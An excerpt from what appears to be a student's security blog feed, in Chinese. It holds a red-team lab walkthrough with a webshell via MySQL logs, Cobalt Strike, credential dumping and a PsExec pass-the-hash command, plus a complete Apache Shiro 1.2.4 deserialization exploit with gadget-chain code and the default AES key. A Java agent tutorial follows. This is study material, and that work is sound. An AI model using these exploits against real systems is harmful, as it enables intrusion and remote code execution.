    <content type="html"><![CDATA[<h1 id="ATT-amp-CK红队评估实战靶场（一）-练习"><a href="#ATT-amp-CK红队评估实战靶场（一）-练习" class="headerlink" title="ATT&amp;CK红队评估实战靶场（一） 练习"></a>ATT&amp;CK红队评估实战靶场（一） 练习</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>已经一个月没有写东西啦，因为期末考试加上自己的项目还有考完还有学校的课程内容一直蛮忙的，一直到16号才放假，上个星期还去安恒实习了，就打算乘着双休搭建一个靶机，想学内网好久了，一直都没有上手操作，这边实际上操作一遍，但是下面的内容还是很蠢的也没有什么值得学习的操作，纯粹是我第一次上手进行内网学习的记录。</p><h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>首先使用nmap进行扫描，使用的命令如下：</p><blockquote><p>nmap -sP 192.168.1.0/24</p></blockquote><p>对192.168.1.0网段进行扫描使用的参数说-sP，使用的是ICMP协议发送echo包来探测的，但是这样不能扫描出禁ping的主机所以要注意一下。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsrxe4ailgj30pm0js0us.jpg" alt=""></p><p>这里可以看见靶机的IP是192.168.1.130，我们继续用nmap扫描一下具体的服务</p><blockquote><p>namp -sV 192.168.1.130</p></blockquote><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsrzqf7tybj30py0k8tcs.jpg" alt=""><br>可以看见开放啦80端口和3306端口先访问看看。<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsrzxwhlipj615b0u0n5r02.jpg" alt=""><br>使用dirsearch爆破一下，发现了phpmyadmin，随手检测一波弱口令就进去啦（因为是靶机的缘故hh）<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss0891arzj30qu09qdhp.jpg" alt=""><br>去看看数据库日志文件的位置，很基础的操作写入shell，没什么好说的。<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss0d4lcogj31l60qwn1p.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss0ipwf22j31ii036mxe.jpg" alt=""></p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss12q5wcpj30x40h4q5n.jpg" alt=""><br>通过日志文件写入shell，然后使用蚁剑进行连接。然后进入蚁剑的虚拟终端</p><blockquote><p>whoami #查看当前用户<br>tasklist /svc # 查看当前进程</p></blockquote><p>并去查看是否存在杀软，不存在直接用cs上线。<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss1kxh79qj31aa0u0aeq.jpg" alt=""></p><p>在cs生成后门文件直接上传，然后进行执行。<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss3yrkyvgj319w0e2t9u.jpg" alt=""><br>进入beacon首先观看一下网卡信息，获得信息如下：<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss43vt7w1j324r0u0ajw.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss4snja48j317u0fmmyx.jpg" alt=""></p><pre><code>win7具有双网卡：      外网：192.168.1.130    内网：192.168.52.143    域：god.org    DNS:192.168.52.138    域内还有两台机器141和138（域控）    只存在一个域GOD</code></pre><p>查看一下域成员<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss5dnjnrzj30nm0euabc.jpg" alt=""></p><p>这里直接使用cs自带的进行提权<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss63afe8ej30u00xpq6x.jpg" alt=""><br>然后直接抓取密码<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss67vdy1aj31vc0s444a.jpg" alt=""><br>这边因为是外网要端口转发到内网端口<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss881yfmhj30su0b2dgm.jpg" alt=""><br>然后进行jump<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss8bw24a9j30v60gqdij.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss84tgruhj31kg0ssth6.jpg" alt=""><br>成功获得一个域内主机<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss8cbt0i0j324q05m0tw.jpg" alt=""><br>这边成功抓取到了Adminstartor的密码和hash，之后可以通过Psexec进行PTH，但是目标主机是内网不能出网，那么我们需要进行中转上线。</p><p>Psexec原理：</p><ul><li>开启admin$</li><li>445端口共享<br>通过ipc$连接，然后释放psexesvc.exe到目标激情。通过服务管理远程创建psexecsvc服务，并启动。</li></ul><p>缺点：目标系统会有一个配色邪恶吃的服务，在windows日志里可以溯源到IP。<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss6dknn8ej313c0d6766.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss6jijq8nj30u4052t9d.jpg" alt=""><br>然后生成一个木马进行中转上线</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss6ine8xdj30l60d83zp.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss6kf8nrwj30pw0giwgd.jpg" alt=""><br>把生成的beacon.exe上传到目标机器，然后再把psexec一起上传<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss7b46v9nj31pw0ngte4.jpg" alt=""></p><blockquote><p>shell C:\PsExec64.exe -accepteula \192.168.52.138 -u GOD\Administrator -p god.org -d -c C:\beacon.exe</p></blockquote><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss90dkwhgj327a0p0aik.jpg" alt=""><br>但是这边我失败了，并没有中转成功，不过我直接用cs的插件成功啦。<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss946n8dnj31cg06gwfy.jpg" alt=""><br>成功上线后抓取域内的密码和hash<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss93egn95j32800mi121.jpg" alt=""></p><p>至此结束了，下面是拓扑<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss9j10olvj314a0hygoh.jpg" alt=""></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次对靶机的学习其实还有很多知识点没有尝试但是因为第一次上手操作磕磕碰碰的耗费了太久的时间就先到这边结束了。也希望我能撑这个暑假学到足够多的知识，在实习中也能有所提高。</p>]]></content>
    
    <summary type="html">
    
      内网
    
    </summary>
    
    
      <category term="内网" scheme="http://yoursite.com/categories/%E5%86%85%E7%BD%91/"/>
    
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
      <category term="内网" scheme="http://yoursite.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>Shiro反序列化漏洞学习</title>
    <link href="http://yoursite.com/2021/06/13/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2021/06/13/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-06-13T11:16:01.000Z</published>
    <updated>2021-07-29T05:50:53.949Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Shiro反序列化漏洞学习"><a href="#Shiro反序列化漏洞学习" class="headerlink" title="Shiro反序列化漏洞学习"></a>Shiro反序列化漏洞学习</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近临近期末，事情变得很多，到了大二后感觉事情明显变多了，感觉人也很累，已经很久没有更新文章了，记得刚刚开始写博客是大一的时候，刚刚开始写博客也只是瞎搞，慢慢的开始注意到自己不能继续下去，于是就删除了以前的文章。尽管现在的文章质量也还是很低，但是希望自己能够慢慢进步。最近不仅要忙期末考试的事情、还要写项目，开始写项目发现自己的代码功底还是很弱，希望能在大三中改善这点。</p><h2 id="shiro简介"><a href="#shiro简介" class="headerlink" title="shiro简介"></a>shiro简介</h2><p>简而言之，Apache Shiro 是一个强大灵活的开源安全框架，可以完全处理身份验证、授权、加密和会话管理。</p><p>Shiro能到底能做些什么呢？</p><ul><li>验证用户身份</li><li>用户访问权限控制，比如：1、判断用户是否分配了一定的安全角色。2、判断用户是否被授予完成某个操作的权限</li><li>在非 Web 或 EJB 容器的环境下可以任意使用Session API</li><li>可以响应认证、访问控制，或者 Session 生命周期中发生的事件</li><li>可将一个或以上用户安全数据源数据组合成一个复合的用户 “view”(视图)</li><li>支持单点登录(SSO)功能</li><li>支持提供“Remember Me”服务，获取用户关联信息而无需登录</li></ul><p>具体的就自己去了解吧。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>这里用的是<a href="https://github.com/phith0n/JavaThings/tree/master/shirodemo/">p牛的代码</a>,其实刚刚开始打算自己写的，但是弄了好久都一直有一个报错，看了看版本，网上的资料，也没找到原因,报错如下。最后用p牛的代码先学一下，希望以后能够解决这个问题。</p><pre><code>Caused by: java.lang.ClassNotFoundException: Unable to load ObjectStreamClass [org.apache.commons.collections.keyvalue.TiedMapEntry: static final long serialVersionUID = -8453869361373831205L;]:     at org.apache.shiro.io.ClassResolvingObjectInputStream.resolveClass(ClassResolvingObjectInputStream.java:55) ~[shiro-core-1.2.4.jar:1.2.4]    at java.io.ObjectInputStream.readNonProxyDesc(ObjectInputStream.java:1984) ~[na:1.8.0_281]    at java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1848) ~[na:1.8.0_281]    at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2158) ~[na:1.8.0_281]    at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1665) ~[na:1.8.0_281]    at java.io.ObjectInputStream.readObject(ObjectInputStream.java:501) ~[na:1.8.0_281]    at java.io.ObjectInputStream.readObject(ObjectInputStream.java:459) ~[na:1.8.0_281]    at java.util.HashMap.readObject(HashMap.java:1410) ~[na:1.8.0_281]    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_281]    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_281]    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_281]    at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_281]    at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1185) ~[na:1.8.0_281]    at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2294) ~[na:1.8.0_281]    at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2185) ~[na:1.8.0_281]    at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1665) ~[na:1.8.0_281]    at java.io.ObjectInputStream.readObject(ObjectInputStream.java:501) ~[na:1.8.0_281]    at java.io.ObjectInputStream.readObject(ObjectInputStream.java:459) ~[na:1.8.0_281]    at org.apache.shiro.io.DefaultSerializer.deserialize(DefaultSerializer.java:77) ~[shiro-core-1.2.4.jar:1.2.4]    ... 28 common frames omittedCaused by: org.apache.shiro.util.UnknownClassException: Unable to load class named [org.apache.commons.collections.keyvalue.TiedMapEntry] from the thread context, current, or system/application ClassLoaders.  All heuristics have been exhausted.  Class could not be found.    at org.apache.shiro.util.ClassUtils.forName(ClassUtils.java:148) ~[shiro-core-1.2.4.jar:1.2.4]    at org.apache.shiro.io.ClassResolvingObjectInputStream.resolveClass(ClassResolvingObjectInputStream.java:53) ~[shiro-core-1.2.4.jar:1.2.4]    ... 46 common frames omitted</code></pre><h2 id="CommonCollection6"><a href="#CommonCollection6" class="headerlink" title="CommonCollection6"></a>CommonCollection6</h2><p>这里用的是cc6的原因也是因为看了p牛的文章，想自己脱离文章试一下。</p><p>先改写一下cc6生成payload,cc6.java改的很简单只是使原来的方法改写成返回字节数组的函数，然后再编写一个test.java将返回的字节码利用shiro 1.2.4内置的密钥进行加密，生成命令执行的rememberMe。</p><h3 id="cc6-java"><a href="#cc6-java" class="headerlink" title="cc6.java"></a>cc6.java</h3><pre><code class="java">import java.io.*;import java.lang.reflect.Field;import java.util.HashMap;import java.util.HashSet;import java.util.Map;public class cc6 &#123;    public byte[] getPayload(String command) throws Exception &#123;        Transformer Testtransformer = new ChainedTransformer(new Transformer[]&#123;&#125;);        Transformer[] transformers=new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,new Class[]&#123;&#125;&#125;),                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,new Object[]&#123;&#125;&#125;),                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc.exe &quot;&#125;)        &#125;;        Map map=new HashMap();        Map lazyMap=LazyMap.decorate(map,Testtransformer);        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,&quot;test1&quot;);        HashSet hashSet=new HashSet(1);        hashSet.add(tiedMapEntry);        lazyMap.remove(&quot;test1&quot;);        //通过反射覆盖原本的iTransformers，防止序列化时在本地执行命令        Field field = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);        field.setAccessible(true);        field.set(Testtransformer, transformers);//        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;test.out&quot;));//        objectOutputStream.writeObject(hashSet);//        objectOutputStream.close();////        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(&quot;test.out&quot;));//        objectInputStream.readObject();        ByteArrayOutputStream stream = new ByteArrayOutputStream();        ObjectOutputStream objectOutputStream = new ObjectOutputStream(stream);        objectOutputStream.writeObject(hashSet);        objectOutputStream.close();        return stream.toByteArray();    &#125;&#125;</code></pre><h3 id="test-java"><a href="#test-java" class="headerlink" title="test.java"></a>test.java</h3><pre><code class="java">import org.apache.shiro.crypto.AesCipherService;import org.apache.shiro.util.ByteSource;public class test &#123;    public static void main(String[] args) throws Exception &#123;        byte[] payload = new cc6().getPayload(&quot;calc.exe&quot;);        AesCipherService aes = new AesCipherService();        byte[] key = java.util.Base64.getDecoder().decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;);        ByteSource ciphertext = aes.encrypt(payload, key);        System.out.printf(ciphertext.toString());    &#125;&#125;</code></pre><p>将生成的rememberMe去访问login.jsp的页面，如图：</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grfp5mdurzj30od0k5wj5.jpg" alt=""></p><p>但是并没有弹出计算器，查看idea的报错：</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grfp7qh1s8j318v09874s.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008i3skNly1grfp7vcb17j318s034weg.jpg" alt=""></p><p>我们查看一下报错的内容，好像是和类没有加载成功有关[Lorg.apache.commons.collections.Transformer;，而这个类就是我们cc6里面用到的Transformer，但是为什么会报错呢，还有这个最前面多余的[L是什么意思？</p><p>我们先来回答第二个问题，这个符号表示的是这是一个数组，即Transformer[]。那么为什么这个类无法加载呢？我们debug进去看一下。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grfpoiwtn6j312s073q3v.jpg" alt=""></p><p>可以看见这里重写了resolve方法，我们先比较一下与原来有什么不同</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grfpvb0lvlj31bh0n4gmm.jpg" alt=""></p><p>在ClassResolvingObjectInputStream.resolveClass中，不同之处就在与父类使用的是Class.forname()而在后者使用的则是org.apache.shiro.util.ClassUtils.forname(),为了知道有什么具体的不同我们跟进进行观察。</p><p>进入ClassUtils.forname()后我们可以发现其实内部调用的是Class.loadClass()这个方法。<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1grfpz8uczjj30uh0djmyy.jpg" alt=""></p><p>在一般情况下Class.forname和Class.loadClass()的效果是相同的，但是loadClass的方法不能加载数组，继续往loadClass里面跟进会调用Class.forName,再继续追就是双亲委派了。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grfqjp3xhbj30uh0djmyy.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008i3skNly1grfqju3vz0j30jo06emxq.jpg" alt=""></p><p>在整体流程里面，WebappsClassLoader会先寻找内部缓存，寻找类，找不到交给URLClasssLoader但是寻找的却是/[Lorg而不是/org打头所以没有找到。</p><p>那么现在找到了原因，cc6中不能使用数组，可是不能使用Transformer的数组岂不是凉了吗，可是p牛还是相处了解决方案。而这个解决方案为之前的fastjson的文章也利用到过，就是使用TemplatesImpl来执行命令。</p><h2 id="修改cc6利用链"><a href="#修改cc6利用链" class="headerlink" title="修改cc6利用链"></a>修改cc6利用链</h2><p>接下来我们先写一个TemplatesImpl：</p><blockquote><p>TemplatesImpl templates = new TemplatesImpl();<br>            setvalue(templates, “_bytecodes”, new byte[][]{clazzBytes});<br>            setvalue(templates, “_name”, “HelloTemplatesImpl”);<br>            setvalue(templates, “_tfactory”, new TransformerFactoryImpl());</p></blockquote><p>这个我们之前<a href="https://www.yuque.com/pyshare-xiaotan/gc6e3o/tbmrhp#dlHvI">fastjson</a>的时候有写到过。</p><pre><code class="java">public static byte[] generateEvil() throws Exception &#123;        ClassPool pool = ClassPool.getDefault();        CtClass clas = pool.makeClass(&quot;Evil&quot;);        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));        String cmd = &quot;Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;;        clas.makeClassInitializer().insertBefore(cmd);        clas.setSuperclass(pool.getCtClass(AbstractTranslet.class.getName()));        clas.writeFile(&quot;./&quot;);        byte[] bytes = clas.toBytecode();        return bytes;    &#125;        public static void main(String[] args) throws Exception &#123;            byte[] clazzBytes = generateEvil();            TemplatesImpl templates = new TemplatesImpl();            setvalue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;clazzBytes&#125;);            setvalue(templates, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);            setvalue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());            templates.newTransformer();        &#125;    public static void setvalue(Object obj, String fieldName, Object value) throws Exception &#123;        Field field = obj.getClass().getDeclaredField(fieldName);        field.setAccessible(true);        field.set(obj,value);    &#125;</code></pre><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grgkukjfatj31c10u016f.jpg" alt=""></p><p>确实可以触发命令执行，那我们在转回去结合cc6看看，如何结合起来。</p><blockquote><p>Transformer[] transformer = new Transformer[]{<br>                new ConstantTransformer(templates),<br>                    new InvokerTransformer(“newTransformer”, null,null)<br>            };</p></blockquote><p>这里的ConstantTransformer会返回对象，然后调用nerTransformer方法，实际上就是原来的templates.newTransformer()。但是这里还是用到了数组，我们现在要想办法代替掉这个步骤。</p><p>我们再转回去看看cc6的代码，其中有这段：</p><pre><code> Map map=new HashMap();        Map lazyMap=LazyMap.decorate(map,Testtransformer);        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,&quot;test1&quot;);        HashSet hashSet=new HashSet(1);        hashSet.add(tiedMapEntry);        lazyMap.remove(&quot;test1&quot;);</code></pre><p>在LazyMap#get的方法中存在this.factory.transform(key)的方法，那我们只要控制这里的key为我们设置的templatesImpl，控制this.factory为invokeTransfomer就可以执行命令了。<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grgm6o80ioj30vu0tsamt.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grgmupoi3sj311406wwfu.jpg" alt=""></p><p>下面接下来的就和cc6一样了，我们控制TideMapEntry中的map为LazyMap就可以了。<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grgmwr006oj311e0sm7ac.jpg" alt=""></p><p>现在利用链已经构造好了，完整代码如下：</p><pre><code>public static byte[] generateEvil() throws Exception &#123;        ClassPool pool = ClassPool.getDefault();        CtClass clas = pool.makeClass(&quot;Evil&quot;);        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));        String cmd = &quot;Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;;        clas.makeClassInitializer().insertBefore(cmd);        clas.setSuperclass(pool.getCtClass(AbstractTranslet.class.getName()));        clas.writeFile(&quot;./&quot;);        byte[] bytes = clas.toBytecode();        return bytes;    &#125;        public static void main(String[] args) throws Exception &#123;            byte[] clazzBytes = generateEvil();            TemplatesImpl templates = new TemplatesImpl();            setvalue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;clazzBytes&#125;);            setvalue(templates, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);            setvalue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());            InvokerTransformer transformer = new InvokerTransformer(&quot;getClass&quot;,null, null);            Map map=new HashMap();            Map lazyMap= LazyMap.decorate(map,transformer);            TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,templates);            HashSet hashSet=new HashSet(1);            hashSet.add(tiedMapEntry);            lazyMap.clear();            setvalue(transformer, &quot;iMethodName&quot;, &quot;newTransformer&quot;);            ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;test.out&quot;));            objectOutputStream.writeObject(hashSet);            objectOutputStream.close();            ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(&quot;test.out&quot;));            objectInputStream.readObject();        &#125;    public static void setvalue(Object obj, String fieldName, Object value) throws Exception &#123;        Field field = obj.getClass().getDeclaredField(fieldName);        field.setAccessible(true);        field.set(obj,value);    &#125;</code></pre><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grgoobc3g6j31kx0u0hdt.jpg" alt=""><br>下面是debug执行命令的具体地方<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grgp36981qj310v0u0dwj.jpg" alt=""><br>但是这里可以注意到cc6原来使用的是remove那为什么我们这里使用的却是clear呢？<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grgomjwdaxj31ce0pogsf.jpg" alt=""></p><p>其实是可以的只是我学太久了，脑子不太灵光了，哈哈。<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grgtukcu7cj30l80a6gpw.jpg" alt=""><br>这样写是可以弹出来的，原来的remove健写错了导致命令执行出现了错误。感兴趣可以自己debug看看。<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grgtvprfz1j31hw0a6dpc.jpg" alt=""></p><p>最后再自己修改一下代码，这里我就不贴了。最后我的环境搭在windows上我mac是m1有点小问题，不过也成功弹出计算器了。<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grguew3s6lj313j0ljte8.jpg" alt=""></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这是我第一次脱离文章自己写东西，以前都是一边看一边写的，感觉收获还是蛮大的，临近期末，事情也越来越多，争取每天都能学到新的东西。</p>]]></content>
    
    <summary type="html">
    
      Shiro反序列化漏洞学习
    
    </summary>
    
    
      <category term="Java" scheme="http://yoursite.com/categories/Java/"/>
    
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Java agent学习</title>
    <link href="http://yoursite.com/2021/05/09/Java%20agent%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2021/05/09/Java%20agent%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-05-09T06:31:01.000Z</published>
    <updated>2021-07-29T08:27:52.761Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java-agent学习"><a href="#Java-agent学习" class="headerlink" title="Java agent学习"></a>Java agent学习</h1><h2 id="JVMTI-（JVM-Tool-Interface）"><a href="#JVMTI-（JVM-Tool-Interface）" class="headerlink" title="JVMTI （JVM Tool Interface）"></a>JVMTI （JVM Tool Interface）</h2><p>JVMTI （JVM Tool Interface）是Java虚拟机对外提供的Native编程接口，通过JVMTI，外部进程可以获取到运行时JVM的诸多信息，比如线程、GC等。Agent是一个运行在目标JVM的特定程序，它的职责是负责从目标JVM中获取数据，然后将数据传递给外部进程。加载Agent的时机可以是目标JVM启动之时，也可以是在目标JVM运行时进行加载，而在目标JVM运行时进行Agent加载具备动态性。</p><h2 id="JVM启动前"><a href="#JVM启动前" class="headerlink" title="JVM启动前"></a>JVM启动前</h2><h3 id="javaagent参数"><a href="#javaagent参数" class="headerlink" title="javaagent参数"></a>javaagent参数</h3><p>javaagent是java命令的一个参数。改参数可指定一个jar包，一条java命令中可多次出现javaagent，对于jar包有下面两个要求：</p><ol><li>这个jar包的MANIFEST.MF文件必须指定Premain-Class项。</li><li>Premain-Class指定的类必须有premain()方法。</li></ol><blockquote><p>premain方法是中JVM启动时先于main函数运行的，JVM启动时会先运行-javaagent指定类的premain方法。</p></blockquote><p>同时javaagent命令要求指定的类必须有premain()，并且对其方法对签名也有要求：</p><pre><code class="java">public static void premain(String agentArgs, Instrumentation inst); public static void premain(String agentArgs);</code></pre><p>JVM会优先价值带Instrumentation签名的方法，加载成功忽略第二种，如果第一种没有，则加载第二种方法。</p><p>Instrumentation类定义如下：</p><pre><code class="java">public interface Instrumentation &#123;    //增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。    void addTransformer(ClassFileTransformer transformer, boolean canRetransform);    //在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。    void addTransformer(ClassFileTransformer transformer);    //删除一个类转换器    boolean removeTransformer(ClassFileTransformer transformer);    boolean isRetransformClassesSupported();    //在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。    void retransformClasses(Class&lt;?&gt;... classes) throws UnmodifiableClassException;    boolean isRedefineClassesSupported();    void redefineClasses(ClassDefinition... definitions)        throws  ClassNotFoundException, UnmodifiableClassException;    boolean isModifiableClass(Class&lt;?&gt; theClass);    @SuppressWarnings(&quot;rawtypes&quot;)    Class[] getAllLoadedClasses();    @SuppressWarnings(&quot;rawtypes&quot;)    Class[] getInitiatedClasses(ClassLoader loader);    //获取一个对象的大小    long getObjectSize(Object objectToSize);    void appendToBootstrapClassLoaderSearch(JarFile jarfile);    void appendToSystemClassLoaderSearch(JarFile jarfile);    boolean isNativeMethodPrefixSupported();    void setNativeMethodPrefix(ClassFileTransformer transformer, String prefix);&#125;</code></pre><p>使用 javaagent 需要几个步骤：</p><ul><li><p>定义一个 MANIFEST.MF 文件，必须包含 Premain-Class 选项，通常也会加入Can-Redefine-Classes 和 Can-Retransform-Classes 选项。</p></li><li><p>创建一个Premain-Class 指定的类，类中包含 premain 方法，方法逻辑由用户自己确定。</p></li><li><p>将 premain 的类和 MANIFEST.MF 文件打成 jar 包。</p></li><li><p>使用参数 -javaagent: jar包路径 启动要代理的方法。</p><p> 在执行以上步骤后，JVM 会先执行 premain 方法，大部分类加载都会通过该方法，注意：是大部分，不是所有。当然，遗漏的主要是系统类，因为很多系统类先于 agent 执行，而用户类的加载肯定是会被拦截的。也就是说，这个方法是在 main 方法启动前拦截大部分类的加载活动，既然可以拦截类的加载，那么就可以去做重写类这样的操作，结合第三方的字节码编译工具，比如ASM，javassist，cglib等等来改写实现类。</p></li></ul><p>下面我们用IDEA来试验一下，我们先创建一个agent_test的项目<br>在src下创建一个lib文件夹放入javassist.jar包。然后再创建一个org.com在文件夹下创建Agent.java,DefineTransformer.java。<br>Agent.java</p><pre><code class="java">package org.com;import java.lang.instrument.Instrumentation;public class Agent &#123;    public static void premain(String agentArgs, Instrumentation inst) &#123;        inst.addTransformer(new DefineTransformer(), true);    &#125;&#125;</code></pre><p>DefineTransformer.java</p><pre><code class="java">public class DefineTransformer implements ClassFileTransformer&#123;    @Override    public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException &#123;        if(&quot;org/com/Main&quot;.equals(className))&#123;            final ClassPool classPool = ClassPool.getDefault();            try &#123;                final CtClass clazz = classPool.get(&quot;org.com.Main&quot;);                CtMethod main = clazz.getDeclaredMethod(&quot;test&quot;);                String methodBody = &quot;&#123; String c = $1.concat(\&quot;-AAA-\&quot;).concat($2);&quot; +                        &quot;System.out.println(&quot;+ &quot;c.toString()&quot;+&quot;);&#125;&quot;;                main.setBody(methodBody);                // 返回字节码，并且detachCtClass对象                byte[] byteCode = clazz.toBytecode();                //detach的意思是将内存中曾经被javassist加载过的Main对象移除，如果下次有需要在内存中找不到会重新走javassist加载                clazz.detach();                return byteCode;            &#125; catch (Exception e) &#123;                e.printStackTrace();            &#125;        &#125;        return null;    &#125;&#125;</code></pre><p>src下/META-INF /MANIFEST.MF</p><pre><code>Manifest-Version: 1.0Can-Redefine-Classes: trueCan-Retransform-Classes: truePremain-Class: org.com.Agent</code></pre><ul><li>注意！！！第五行要留空<br>然后生成agent_test.jar随后再创建一个Main.java</li></ul><p>Main.java</p><pre><code class="java">package org.com;public class Main &#123;    public static void main(String[] args) &#123;        System.out.println(&quot;thisismain&quot;);        test(&quot;a&quot;,&quot;bcd&quot;);    &#125;    public static void test(String a1, String a2)&#123;        System.out.println(&quot;test&quot;);    &#125;&#125;</code></pre><p>这里要记得添加参数</p><blockquote><p>-javaagent:out/artifacts/agent_test_jar/agent_test.jar</p></blockquote><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gqbyuws73tj30ue0l6q3x.jpg" alt=""><br>然后运行Main文件可以看见<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gqbyogvj1sj30dl05p3yj.jpg" 